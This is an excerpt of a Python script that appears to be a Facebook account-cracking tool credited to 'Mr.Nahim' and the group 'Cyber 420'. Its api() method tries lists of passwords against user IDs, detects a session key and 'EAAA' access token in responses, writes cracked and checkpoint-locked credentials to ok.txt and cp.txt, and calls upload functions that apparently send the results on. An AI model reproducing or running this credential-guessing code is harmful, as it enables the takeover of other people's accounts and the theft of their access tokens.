...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGERðŸ”°RR-RIYAD")
...
class Main:
	def __init__(self):
		...
		print ("""\033[1;92m ______ ____        _  _______ _   _  _____     
|  ____|  _ \      | |/ /_   _| \ | |/ ____|
 | |__  | |_) |_____| ' /  | | |  \| | |  __ 
 |  __| |  _ <______|  <   | | | . ` | | |_ |
 | |    | |_) |     | . \ _| |_| |\  | |__| |
...
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mFACEBOOK : Chand Muhammad Khan  
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mFB GROUP : Cyber 420 The Silent Killer's 
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mGITHUB   : Nahim404
\033[1;91m [\033[1;94mâœ“\033[1;91m] \033[1;92mWARNING  : Maisar Chele Araf Er mare Xudi
\033[1;90mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Mr.Nahim_OLD] : %s/%s -> \033[0;92m [ Mr.Nahim-OK:%s ]- \033[0;91m[Mr.Nahim-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Mr.Nahim-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Mr.Nahim-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Mr.Nahim-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
